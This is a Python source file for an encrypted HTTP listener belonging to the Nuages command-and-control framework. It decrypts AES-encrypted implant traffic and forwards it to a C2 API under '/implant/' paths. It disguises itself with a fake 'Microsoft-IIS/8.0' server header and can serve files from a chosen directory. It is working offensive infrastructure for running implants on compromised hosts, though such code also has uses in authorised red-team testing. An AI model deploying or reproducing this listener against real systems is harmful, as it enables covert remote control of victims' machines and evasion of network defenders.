#!/usr/bin/env python
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.server import SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
import base64
import hashlib
import requests
from Crypto import Random
from Crypto.Cipher import AES
import cgi
from sys import argv
import binascii
import io
import argparse
import os
import sys

class HTTPerror(Exception):
    def __init__(self,HTTPCode,HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent

class PKCS7Encoder(object):
    def __init__(self, k=16):
       self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, bytestring):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        val = bytestring[-1]
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')
        l = len(bytestring) - val
        return bytestring[:l]

    ## @param text The text to encode.
    def encode(self, bytestring):
        """
        Pad an input bytestring according to PKCS#7

        """
        l = len(bytestring)
        val = self.k - (l % self.k)
        return bytestring + bytearray([val] * val)

class AESCipher(object):

    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        #return base64.b64encode(iv + cipher.encrypt(raw))
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return pkcs7.encode(s)

    def _unpad(self, s):
        return pkcs7.decode(s)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

class S(SimpleHTTPRequestHandler):
    def _set_headers(self, code):
        self.send_response_only(code)
        self.send_header('Server', "Microsoft-IIS/8.0")
        self.send_header('Date', self.date_time_string())
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def POST(self, url, body):
        headers = {'Content-type': 'application/json; charset=utf-8'}
        if(args.id):
            headers["listener"] = args.id
        
        response = requests.post(connectionString + url, data = body.encode('utf-8'), verify=True, headers=headers)
        if(response.ok):
            return response.content
        else:
            raise HTTPerror(response.status_code,response.content)

    def do_POST(self):
        length = int(self.headers['content-length'])
        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers['Authorization']))
        try:
            response = (self.POST(url,aes.decrypt(self.rfile.read(length))))
            self._set_headers(200)
            self.wfile.write(aes.encrypt(response))
            if(not(args.quiet)):
                self.log_request(200)
                print(url)
        except HTTPerror as e:
            self._set_headers(e.HTTPCode)
            self.wfile.write(aes.encrypt(e.HTTPContent))
            if(not(args.quiet)):
                self.log_request(e.HTTPCode)
                print(url)
        except Exception as e:
            raise e


    def do_GET(self):
        if args.directory == None:
            SimpleHTTPRequestHandler.send_error(self,404)
            return
        if self.path[-1:]=="/":
            SimpleHTTPRequestHandler.send_error(self,404)
            return
        SimpleHTTPRequestHandler.do_GET(self)
    
    def log_message(self, format, *args2):
        if(args.quiet):
            return       
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.address_string(),
                          self.log_date_time_string(),
                          format%args2))
        
def run(server_class=ThreadingSimpleServer, handler_class=S, port=4040):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('Starting AES256 Handler on port: ' + str(port))
    try:
        while 1:
            sys.stdout.flush()
            httpd.handle_request()
    except KeyboardInterrupt:
        print('Finished.')
        sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages HTTP handler')
    parser.add_argument("-p", "--port", default=80,  help="The port to listen on")
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-d", "--directory", help="Directory to serve for GET requests")
    parser.add_argument("-i", "--id", help="The listener ID for listener tracking")
    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
    args = parser.parse_args() 
    # The encryption password
    aes = AESCipher(args.key)
    #The address of the Nuages C2 Server
    connectionString  = args.uri
    pkcs7 = PKCS7Encoder()
    if args.directory != None:
        os.chdir(args.directory)
    if len(argv) > 1:
        run(ThreadingSimpleServer, S, int(args.port))
    else:
        run()
